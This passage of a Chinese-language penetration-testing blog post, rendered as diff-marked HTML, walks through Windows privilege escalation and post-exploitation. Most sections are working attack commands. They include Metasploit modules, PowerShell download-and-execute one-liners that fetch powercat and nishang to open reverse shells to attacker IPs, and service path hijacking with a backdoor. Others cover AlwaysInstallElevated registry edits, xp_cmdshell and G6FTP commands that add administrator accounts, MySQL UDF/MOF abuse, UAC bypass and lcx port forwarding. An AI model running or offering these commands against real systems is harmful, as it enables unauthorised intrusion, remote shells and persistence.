+<h3 id="查询系统补丁情况"><a href="#查询系统补丁情况" class="headerlink" title="查询系统补丁情况"></a>查询系统补丁情况</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[*] Patch list saved to /Users/lin/.msf4/loot/20211012160507_default_10.2.14.45_enum_patches_916671.txt</span><br><span class="line">[+] KB2959936 installed on 11/21/2014</span><br><span class="line">[+] KB2894852 installed on 9/12/2021</span><br><span class="line">[+] KB2896496 installed on 11/21/2014</span><br><span class="line">[+] KB2919355 installed on 11/21/2014</span><br><span class="line">[+] KB2920189 installed on 11/21/2014</span><br><span class="line">[+] KB2928120 installed on 11/21/2014</span><br><span class="line">[+] KB2931358 installed on 11/21/2014</span><br><span class="line">[+] KB2931366 installed on 11/21/2014</span><br><span class="line">[+] KB2933826 installed on 11/21/2014</span><br><span class="line">[+] KB2938066 installed on 9/12/2021</span><br><span class="line">[+] KB2938772 installed on 11/21/2014</span><br><span class="line">[+] KB2949621 installed on 11/21/2014</span><br><span class="line">[+] KB2954879 installed on 11/21/2014</span><br><span class="line">[+] KB2958262 installed on 11/21/2014</span><br><span class="line">[+] KB2958263 installed on 11/21/2014</span><br><span class="line">...........</span><br></pre></td></tr></table></figure>
+
+<p>可以使用 msf 提供提权建议的模块进行扫描从而辅助提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use  post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_patches</span><br></pre></td></tr></table></figure>
+
+<p>使用模块进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms16_075  #搜索ms16_075相关模块</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/ms16_075_reflection_juicy #使用模块</span><br><span class="line">set session 1 #设置要提权的会话</span><br><span class="line">run #执行</span><br></pre></td></tr></table></figure>
+
+<p>成功将普通 iis 用户提权至 system 权限</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634026643/55_upy0xa.png"></p>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>由于系统是 X64 的，我们将获取到的会话迁移到 64 位进程中去，防止 session 断掉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps  #查看进程</span><br></pre></td></tr></table></figure>
+
+<p>随意迁移到一个 64 位的进程中即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 488 #迁移进程到pid为488的进程中</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634026881/Xnip2021-10-12_16-21-10_mi4ofq.png"></p>
+<h2 id="交互-shell-与非交互-shell"><a href="#交互-shell-与非交互-shell" class="headerlink" title="交互 shell 与非交互 shell"></a>交互 shell 与非交互 shell</h2><h3 id="交互-shell"><a href="#交互-shell" class="headerlink" title="交互 shell"></a>交互 shell</h3><p>交互 shell 就是 shell 等待你的输入，并且立即执行你提交的命令。这种模式被称作交互式是因为 shell 与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当签退后，shell 也终止了。需要进行信息交互，例如输入某个信息会返回信息，你需要对其输入内容，输入会执行命令。例如 cmd 终端、msf 反弹后门 shell、nc 反弹 shell、这些都属于交互 shell</p>
+<h3 id="非交互-shell"><a href="#非交互-shell" class="headerlink" title="非交互 shell"></a>非交互 shell</h3><p>shell 也可以运行在另外一种模式：非交互式模式，以 shell script (非交互) 方式执行。在这种模式下，shell 不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾，shell 也就终止了。</p>
+<h3 id="nc-反弹-shell-提权"><a href="#nc-反弹-shell-提权" class="headerlink" title="nc 反弹 shell 提权"></a>nc 反弹 shell 提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9002 #攻击者执行监听、监听9002端口</span><br></pre></td></tr></table></figure>
+
+<p>上传 nc 到目标主机执行 nc 反弹 shell</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634031010/Xnip2021-10-12_17-29-55_jhdbsl.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwncat -l 9002 #我使用比较多的</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634031109/Xnip2021-10-12_17-31-35_q1vrne.png"></p>
+<h3 id="powershell-反弹-shell-提权"><a href="#powershell-反弹-shell-提权" class="headerlink" title="powershell 反弹 shell 提权"></a>powershell 反弹 shell 提权</h3><p>powercat 是 netcat 的 powershell 版本</p>
+<p>下载地址： <a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorh</span><br><span class="line">ino/powercat/master/powercat.ps1&#x27;); powercat -c 192.168.1.4 -p 9999 -e cmd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://10.46.2.124:8000/powercat.ps1&#x27;); powercat -c 10.46.2.124 -p 9002 -e cmd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634031875/Xnip2021-10-12_17-44-09_votde7.png"></p>
+<h3 id="nishang-反弹-shell"><a href="#nishang-反弹-shell" class="headerlink" title="nishang 反弹 shell"></a>nishang 反弹 shell</h3><p>Nishang <a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> 是一个基于 PowerShell 的攻击框架，集合了一些 PowerShell 攻击脚本和有效载荷，可反弹 TCP&#x2F; UDP&#x2F; HTTP&#x2F;HTTPS&#x2F; ICMP 等类型 shell</p>
+<p><strong>Reverse TCP shell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object</span><br><span class="line">Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/InvokePowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object</span><br><span class="line">Net.WebClient).DownloadString(&#x27;http://192.168.0.195/nishang/Shells/InvokePowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.195 -port 6666</span><br></pre></td></tr></table></figure>
+
+<p><strong>Reverse UDP shell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object</span><br><span class="line">Net.WebClient).DownloadString(&#x27;http://192.168.0.195/nishang/Shells/InvokePowerShellUdp.ps1&#x27;);</span><br><span class="line">Invoke-PowerShellUdp -Reverse -IPAddress 192.168.0.195 -port 53</span><br></pre></td></tr></table></figure>
+
+<h2 id="windows-系统配置错误提权"><a href="#windows-系统配置错误提权" class="headerlink" title="windows 系统配置错误提权"></a>windows 系统配置错误提权</h2><h3 id="系统服务配置错误"><a href="#系统服务配置错误" class="headerlink" title="系统服务配置错误"></a>系统服务配置错误</h3><p>Windows 在系统启动时，会伴随着一些搞权限服务启动 (windows 服务是以 system 权限运行的) 倘若某些服务存在一些漏洞，那么就能够借此服务进行权限劫持，例如 DLL 劫持</p>
+<h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>windows 系统服务文件在操作系统启动时加载执行，并在后台调用可执行文件。如果一个低权限的用户对此类系统服务调用的可执行文件拥有写权限，那么就可以替换该文件，并随着系统启动获得控制权限。windows 服务是以 system 权限运行的，其文件夹、文件和注册表 key-value 都是受强制访问控制保护的。但是在某些情况下，操作系统中依然存在一些没有得到有效保护的服务。</p>
+<h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>PrivescCheck 列出可能存在问题的所有服务并分析能否利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/itm4n/PrivescCheck.git  #下载</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object</span><br><span class="line">Net.WebClient).DownloadString(&#x27;http://10.46.2.124:8000/PrivescCheck.ps1&#x27;); InvokePrivescCheck&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634035143/Xnip2021-10-12_18-38-53_fd9a0y.png"></p>
+<p>NT AUTHORITY\Authenticated Users 意味着普通用户可以对 usosvc 服务进行设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc query  UsoSvc  #查询服务状态</span><br><span class="line">sc stop  UsoSvc   #停止服务</span><br><span class="line">/c sc config usosvc binPath= &quot;C:\a.exe&quot; #劫持 a.exe 为cs后门文件</span><br><span class="line">sc start  UsoSvc  #启动服务</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634038349/Xnip2021-10-12_19-32-13_qgr0zz.png"></p>
+<p>msf 利用</p>
+<p>使用攻击模块 exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</p>
+<p>service_permissions 模块会使用两种方式获取 system 权限，如果以管理员权限运行，会尝试创建并运行一个新的服务。如果当前权限不允许创建服务，则会判断哪些服务的文件或文件夹的权限有问题，并对其进行劫持在劫持服务时会创建一个可执行程序，其文件名和安装路径都是随机的。</p>
+<h3 id="不带引号的服务路径提权"><a href="#不带引号的服务路径提权" class="headerlink" title="不带引号的服务路径提权"></a>不带引号的服务路径提权</h3><h4 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>当系统管理员配置 Windows 服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Program Files\WinRAR\Rar.exe&quot; #有双引号的时候 正常执行Rar.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\WinRAR\Rar.exe #没有双引号的时候 windows会把空格前面的当做exe文件执行</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#使用PowerUp.ps1进行检测，会遍历出带有空格的文件路径</span><br><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object</span><br><span class="line">Net.WebClient).DownloadString(&#x27;http://10.46.0.228/PowerUp.ps1&#x27;); InvokeAllChecks&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#或者使用命令</span><br><span class="line">wmic service get name,displayname,pathname,startmode|findstr /i &quot;Auto&quot; |findstr</span><br><span class="line">/i /v &quot;C:Windows&quot; |findstr/i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634093366/Xnip2021-10-13_10-49-09_aock2u.png"></p>
+<p>如上图所示路径中存在空格，如果 c 盘有写入和执行权限的话，可以上传一个名为 Program.exe 的后门文件到 c 盘根目录下，重启服务器即可上线 msf。</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634093569/Xnip2021-10-13_10-52-36_syqden.png"></p>
+<p>注：要设置 msf 进程自动迁移，不然 session 很容易掉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set AutoRunScript migrate -f   #msf自动迁移进程</span><br></pre></td></tr></table></figure>
+
+<h3 id="注册键-AlwaysInstallElevated"><a href="#注册键-AlwaysInstallElevated" class="headerlink" title="注册键 AlwaysInstallElevated"></a>注册键 AlwaysInstallElevated</h3><h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>允许低权限用户以 System 权限安装文件。如果启用此策略设置项，那么任何权限的用户都以 NT Authority\System 权限来安装恶意的 MSI 文件。 windows install 是 windows 操作系统的组件之一，专门用来管理配置软件服务。它除了是一个安装程序，还用于管理软件的安装、组件的添加、删除、监视文件的还原、通过回滚进行灾难恢复。windows install 通过 msiexec.exe 安装 MSI 文件，双击 MSI 文件就会<br>运行 msiexec.exe。 原理：是因为用户打开了 windows installer 特权安装功能。</p>
+<h4 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#命令行修改注册表</span><br><span class="line">reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer /v</span><br><span class="line">AlwaysInstallElevated /t REG_DWORD /d 1</span><br><span class="line">Reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer /v</span><br><span class="line">AlwaysInstallElevated /t REG_DWORD /d 1</span><br></pre></td></tr></table></figure>
+
+<p>使用 PowerUp 检测注册表是否有设置 如果返回 true 证明可以利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/c PowerShell -nop -exec bypass IEX(New-Object</span><br><span class="line">Net.WebClient).DownloadString(&#x27;http://10.46.0.228/PowerUp.ps1&#x27;); GetRegAlwaysInstallElevated</span><br><span class="line">#权限过低就会返回false</span><br></pre></td></tr></table></figure>
+
+<p>上传 C:\ProgramData\COMahawk64.exe 执行即可获取一个系统得账号和密码</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634108784/Xnip2021-10-13_15-06-07_xv2mdi.png"></p>
+<h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>禁用注册表键 AlwaysInstallElevated</p>
+<h3 id="自动安装配置文件提权"><a href="#自动安装配置文件提权" class="headerlink" title="自动安装配置文件提权"></a>自动安装配置文件提权</h3><h4 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>网络管理员在内网中给多台机器配置同一个环境的时候，一般会使用脚本进行批量部署，也就是会使用安装配置文件，这些文件中包含所有的安装配置信息，其中还有一些包含着本地管理员账号和密码。</p>
+<h4 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /b /s c:\Unattend.xml #搜索Unattend.xml文件 Unattend.xml文件是使用了base64对管理员的密码进行编码的</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用 msf 的 post&#x2F;windows&#x2F;gather&#x2F;enum_unattend 对这个配置文件扫描</p>
+<h2 id="本地-dll-劫持提权"><a href="#本地-dll-劫持提权" class="headerlink" title="本地 dll 劫持提权"></a>本地 dll 劫持提权</h2><h3 id="漏洞简介-2"><a href="#漏洞简介-2" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Windows 程序启动的时候需要 DLL。如果这些 DLL 不存在，则可以通过在应用程序要查找的位置放置恶意 DLL 来提权。通常，Windows 应用程序有其预定义好的搜索 DLL 的路径，它会根据下面的顺序进行搜索：</p>
+<p>1、应用程序加载的目录<br>2、C:\Windows\System32<br>3、C:\Windows\System<br>4、C:\Windows<br>5、当前工作目录 Current Working Directory，CWD<br>6、在 PATH 环境变量的目录（先系统后用户）</p>
+<p>这样的加载顺序很容易导致一个系统 dll 被劫持，因为只要攻击者将目标文件和恶意 dll 放在一起即可，导致恶意 dll 先于系统 dll 加载，而系统 dll 是非常常见的，所以当时基于这样的加载顺序，出现了大量受影响软件</p>
+<h3 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>程序运行一般会加载系统 dll 或本身程序自带的 dll，如果我们将程序执行时需要加载的 dll 文件替换成木马程序，那么我们下次在启动程序时所加载的 dll 就是我们替换的那个木马程序了。</p>
+<p>攻击过程：收集进程加载的 dll - 制作 dll 木马并上传 - 替换 dll - 启动应用后成功加载恶意 dll</p>
+<p>1、收集进程加载的 dll<br>使用火绒剑分析该进程执行时加载了哪些 dll</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634113570/Xnip2021-10-13_16-25-17_gcsdc3.png"></p>
+<p>系统文件一般我们是更改不了的，所以一般选择未知文件和数字签名文件</p>
+<p>将它加载的 dll 文件替换为恶意 dll 文件即可</p>
+<h2 id="第三方服务提权"><a href="#第三方服务提权" class="headerlink" title="第三方服务提权"></a>第三方服务提权</h2><p>除了系统自带的服务外 ，安装第三方的软件例如 mysql sqlserver ftp 等应用软件，如果权限设置不对，会对服务器造成安全隐患，从而导致服务器被提权。</p>
+<h3 id="SQL-SERVER-提权"><a href="#SQL-SERVER-提权" class="headerlink" title="SQL SERVER 提权"></a>SQL SERVER 提权</h3><h4 id="漏洞介绍-2"><a href="#漏洞介绍-2" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>如果网站里面使用的数据库是 sqlserver 那么如果找到 sa 的密码，利用提权脚本，执行命令，但是不一定是系统权限，还要看管理员开始安装 sqlserver 的权限设置，一般情况是 system 权限或者 pulic 均能执行命令</p>
+<p>敏感文件</p>
+<p>web.config<br>config.asp<br>conn.aspx<br>database.aspx</p>
+<h4 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>使用 mssql 连接工具、sqltools 或者 webshell net 提权脚本输入账号和密码连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Exec sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;RECONFIGURE;</span><br><span class="line">Exec master.dbo.xp_cmdshell &#x27;net user lx 123456 /add &amp; net localgroupadministrators lx /add&#x27; //添加用户并加入管理组</span><br><span class="line">Exec master.dbo.xp_cmdshell &#x27;systeminfo&#x27;  //系统信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="mysql-提权"><a href="#mysql-提权" class="headerlink" title="mysql 提权"></a>mysql 提权</h3><h4 id="udf-提权"><a href="#udf-提权" class="headerlink" title="udf 提权"></a>udf 提权</h4><h4 id="漏洞简介-3"><a href="#漏洞简介-3" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>在 mysql 可以使用自定义函数进行提权，udf &#x3D; user defined function 用户自定义函数对于自定义的函数 在 mysql5.1 版本以后就需要放在插件插件目录 &#x2F;lib&#x2F;plugin , 文件后缀 dll，c 语言编写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot; #查询插件目录</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>寻找 mysql 服务的连接账号和密码、一般存在于网站配置文件中</p>
+<p>使用 exp 创建一个 udf 函数执行命令即可</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634116416/Xnip2021-10-13_17-13-23_vhzf28.png"></p>
+<h4 id="mysql-提权问题"><a href="#mysql-提权问题" class="headerlink" title="mysql 提权问题"></a>mysql 提权问题</h4><p>1、版本有 32 和 64 位的 mysql 创建函数的方法一样，但是 64 版本的要用 64 的 udf.dll</p>
+<p>2、报错 The MySQL server is running with the –secure-file-priv option so it cannot execute this statement 这种是 mysql 默认设置是不允许导入导出 需要在 my.ini 添加 secure-file-priv &#x3D; 保存重启 mysql 即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@global.secure_file_priv  #查询导入导出配置</span><br></pre></td></tr></table></figure>
+
+<p>3、Can’t create&#x2F;write to file ‘D:\phpStudy\MySQL\lib\plugin\udf.dll 这种是没有权限导出或者 plugin 目录不存在，需要手动创建或者权限不够。</p>
+<h4 id="mof-提权"><a href="#mof-提权" class="headerlink" title="mof 提权"></a>mof 提权</h4><p>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。在 MOF 文件中创建类实例和类定义后，可以对该文件进行编译。编译 MOF 文件将在 CIM 储存库中注册所有的类定义和实例。之后，提供程序、事件类别和事件信息，便可由 WMI 和 Visual Studio Analyzer 使用。 在 MOF 文件中创建提供程序、事件类别和事件类的实例，并且定义想要分析的自定义对象，之后，就可以对该文件进行编译。</p>
+<h4 id="漏洞简介-4"><a href="#漏洞简介-4" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>mof 是 windows 系统的一个文件（在 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof）叫做” 托管对象格式” 其作用是每隔五秒就会去监控进程创建和死亡。其实就是用有了 mysql 的 root 权限了以后，然后使用 root 权限去执行我们上传的 mof。隔了一定时间以后这个 mof 就会被执行，这个 mof 当中有一段是 vbs 脚本，这个 vbs 大多数的是 cmd 的添加管理员用户的命令。</p>
+<h4 id="漏洞影响版本-1"><a href="#漏洞影响版本-1" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h4><p>windows 03 及以下版本</p>
+<p>需要满足以下条件</p>
+<p>1、mysql 启动身份具有权限去读写 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof 目录<br>2、secure-file-priv 参数不为 null</p>
+<p>利用网上现成的 payload 利用即可</p>
+<h3 id="G6FTP-提权"><a href="#G6FTP-提权" class="headerlink" title="G6FTP 提权"></a>G6FTP 提权</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>G6 FTP Server 新一代的 FTP 服务器端软件，支持 RFC-959 标准并增强其中的某些功能，上传和下载都可以续传，实时查看运行状态，占用带宽，还有很多功能。</p>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>G6FTP 的默认端口为 8021，只侦听在 127.0.0.1 的 8021 端口上，所以无法从外部直接访问，需要进行端口转发（使用 lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。</p>
+<h4 id="漏洞复现-10"><a href="#漏洞复现-10" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files (x86)\Gene6 FTP Server\RemoteAdmin\Remote.ini  #寻找G6FTP配置文件 cmd5解密码</span><br></pre></td></tr></table></figure>
+
+<p>使用 lcx 工具将 8021 转发到其它端口之后使用 G6FTP 客户端连接 把所有权限打勾、将自己权限提升到最高</p>
+<p>将以下添加管理员命令设置为 G6FTP SET 命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test QWEasd123 /add &amp;&amp; net localgroup administrators test /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634118007/Xnip2021-10-13_17-39-53_raj22b.png"></p>
+<p>登录 ftp 执行 quote stie A 即可</p>
+<p>写到启动项执行后门</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp://192.168.0.108/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start%</span><br><span class="line">20Menu/Programs/Startup/</span><br></pre></td></tr></table></figure>
+
+<h2 id="uac-bypass"><a href="#uac-bypass" class="headerlink" title="uac bypass"></a>uac bypass</h2><h3 id="漏洞简介-5"><a href="#漏洞简介-5" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>UAC（UserAccount Control，用户账户控制）简言之就是在 Vista 及更高版本中通过弹框进一步让用户确认是否授权当前可执行文件来达到阻止恶意程序的目的。</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634603300/Xnip2021-10-19_08-27-58_fxmgx9.png"></p>
+<h3 id="漏洞复现-11"><a href="#漏洞复现-11" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用 bypassuac 模块一般是可以绕过的 但是也不排除失败的可能 msf 和 cs 均有对应的模块可以一键利用</p>
+<p>原理就是通过进程注入使用可信任发布者证书绕过 Windows UAC</p>
+<p>msf 模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/bypassuac_injection #此模块成功率更高</span><br><span class="line">此模块将利用受信任的通过进程注入发布者证书。它将产生一个关闭UAC标志的第二个shell。此模块使用反射DLL注入技术，仅丢弃DLL有效负载二进制文件，而不是标准技术中的三个单独的二进制文件。但是，它需要选择正确的体系结构x64（也适用于SYSWOW64系统）。如果指定EXE:：自定义DLL应在单独启动有效负载后调用ExitProcess（）</span><br></pre></td></tr></table></figure>
+
+<h2 id="LCX-端口转发"><a href="#LCX-端口转发" class="headerlink" title="LCX 端口转发"></a>LCX 端口转发</h2><h3 id="工具简介"><a href="#工具简介" class="headerlink" title="工具简介"></a>工具简介</h3><p>lcx 是一款强大的内网端口转发工具，用于将内网主机开放的内部端口映射到外网主机（有公网 IP）任意端口。它是一款命令行工具，当然也可以在有权限的 webshell 下执行，正因如此 lcx 常被认为是一款黑客入侵工具，lcx 在内网入侵渗透中起着重要的角色。lcx 进行端口转发的原理就是使不同端口之间形成一个回路。它常用于外网连接内网 3389 端口</p>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[option:]</span><br><span class="line">-listen &lt;ConnectPort&gt; &lt;TransmitPort&gt;</span><br><span class="line">-tran &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span><br><span class="line">-slave &lt;ConnectHost&gt; &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h3><p>本地转发主要是把 127.0.0.1: 端口 这个本地端口转发到外部，让外部的客户端允许连接进来</p>
